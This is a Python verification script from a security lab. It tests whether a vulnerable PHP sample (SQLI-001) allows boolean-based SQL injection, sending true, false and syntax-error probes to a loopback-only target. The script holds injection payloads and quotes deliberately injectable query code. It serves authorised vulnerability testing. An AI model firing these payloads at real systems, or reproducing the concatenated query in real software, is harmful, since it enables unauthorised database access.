#!/usr/bin/env python3
"""SQLI-001 local boolean-differential verification draft.

Target code path (normalized_samples/SQLI-001.php, local line numbers):
   8  : $id=$_GET['id'];
  14  : $sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
  15  : $result=mysql_query($sql);
  16  : $row = mysql_fetch_array($result);
  20  : echo 'Your Login name:'. $row['username'];
  22  : echo 'Your Password:' .$row['password'];
  28  : print_r(mysql_error());

Safety: loopback targets only, redirects refused, GET only, boolean
comparison only - no enumeration, no data export, no writes.
"""

import argparse
import http.cookiejar
import json
import re
import sys
import urllib.error
import urllib.parse
import urllib.request

ALLOWED_HOSTS = {"localhost", "127.0.0.1", "::1"}

LOGIN_RE = re.compile(r"Your Login name:\s*([^<\r\n]*)")
PASS_RE = re.compile(r"Your Password:\s*([^<\r\n]*)")
SQL_ERR_RE = re.compile(
    r"(You have an error in your SQL syntax|check the manual|Warning:\s*mysql_)",
    re.IGNORECASE,
)
IFACE_ERR_RE = re.compile(
    r"(undefined function\s+mysql_|Call to undefined function)", re.IGNORECASE
)


def die(msg):
    print("PRECONDITION_FAILURE: " + msg)
    sys.exit(2)


def parse_target(base_url):
    parts = urllib.parse.urlsplit(base_url)
    if parts.scheme not in ("http", "https"):
        die("base URL must be http(s), got scheme %r" % parts.scheme)
    host = (parts.hostname or "").lower()
    if host not in ALLOWED_HOSTS:
        die("refusing non-loopback host %r; widen ALLOWED_HOSTS only for an authorized lab" % host)


class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


def build_opener(cookie_file):
    handlers = [NoRedirect()]
    if cookie_file:
        jar = http.cookiejar.MozillaCookieJar(cookie_file)
        try:
            jar.load(ignore_discard=True, ignore_expires=True)
        except OSError as exc:
            die("cannot load cookie file: %s" % exc)
    else:
        jar = http.cookiejar.CookieJar()
    handlers.append(urllib.request.HTTPCookieProcessor(jar))
    return urllib.request.build_opener(*handlers)


def request_once(opener, base_url, path, name, value, timeout):
    url = base_url.rstrip("/") + path
    query = urllib.parse.urlencode({name: value})
    req = urllib.request.Request(url + "?" + query, method="GET")
    try:
        with opener.open(req, timeout=timeout) as resp:
            body = resp.read().decode("utf-8", "replace")
            return {"status": resp.status, "url": resp.geturl(), "body": body}
    except urllib.error.HTTPError as exc:
        body = exc.read().decode("utf-8", "replace") if exc.fp else ""
        return {"status": exc.code, "url": url, "body": body}
    except urllib.error.URLError as exc:
        return {"status": None, "url": url, "body": "", "error": str(exc.reason)}


def observe(result):
    body = result["body"]
    login = LOGIN_RE.search(body)
    password = PASS_RE.search(body)
    return {
        "status": result["status"],
        "login_name": login.group(1).strip() if login else None,
        "password": password.group(1).strip() if password else None,
        "row_rendered": login is not None,
        "sql_error_text": bool(SQL_ERR_RE.search(body)),
        "php_iface_error": bool(IFACE_ERR_RE.search(body)),
        "transport_error": result.get("error"),
    }


def main():
    ap = argparse.ArgumentParser(description="SQLI-001 boolean differential draft")
    ap.add_argument("--base-url", required=True, help="e.g. http://127.0.0.1:8080")
    ap.add_argument("--path", required=True,
                    help="deployed path of the file whose source is normalized_samples/SQLI-001.php")
    ap.add_argument("--param", default="id", help="GET parameter name taken from code (default: id)")
    ap.add_argument("--cookie-file", default=None,
                    help="optional Netscape cookie file; never printed")
    ap.add_argument("--timeout", type=float, default=10.0)
    args = ap.parse_args()

    parse_target(args.base_url)
    opener = build_opener(args.cookie_file)

    probes = [
        ("normal", "1"),
        ("true_condition", "1' AND '1'='1"),
        ("false_condition", "1' AND '1'='2"),
        ("syntax_error_control", "1'"),
    ]

    results = {}
    for label, payload in probes:
        raw = request_once(opener, args.base_url, args.path, args.param, payload, args.timeout)
        results[label] = observe(raw)
        print("[%s] %s" % (label, json.dumps(results[label], ensure_ascii=False)))

    normal = results["normal"]
    tru = results["true_condition"]
    fal = results["false_condition"]
    err = results["syntax_error_control"]

    if normal["transport_error"] or normal["status"] is None:
        die("baseline request failed: %s" % normal["transport_error"])
    if normal["status"] in (301, 302, 303, 307, 308):
        die("baseline redirected (HTTP %s): auth/session precondition failed, not a filter" % normal["status"])
    if normal["php_iface_error"]:
        die("mysql_* interface unavailable on this PHP build: environment failure, not a filter")
    if not normal["row_rendered"]:
        die("baseline id=1 rendered no 'Your Login name:' row; observation area unvalidated "
            "(check dataset row, path and parameter name)")

    differential = (
        tru["row_rendered"]
        and not tru["sql_error_text"]
        and tru["login_name"] == normal["login_name"]
        and not fal["row_rendered"]
        and not fal["sql_error_text"]
        and err["sql_error_text"]
    )

    summary = {
        "normal_row_present": normal["row_rendered"],
        "true_row_present": tru["row_rendered"],
        "true_matches_normal": tru["login_name"] == normal["login_name"],
        "false_row_absent": not fal["row_rendered"],
        "false_has_no_sql_error": not fal["sql_error_text"],
        "syntax_control_produces_error": err["sql_error_text"],
        "differential_observed": differential,
    }
    print(json.dumps(summary, ensure_ascii=False))

    if differential:
        print("RESULT: boolean differential observed (quote break reached MySQL as valid SQL and "
              "changed row rendering, while the malformed control raised a syntax error). "
              "Repeat once with a second normal id (e.g. 2) before recording confirmation.")
        return 0
    if fal["row_rendered"]:
        print("RESULT: no differential - FALSE payload still rendered a row; input may be escaped "
              "or the dataset row differs. This is not proof of safety.")
        return 1
    print("RESULT: inconclusive - review the probe lines above.")
    return 1


if __name__ == "__main__":
    sys.exit(main())
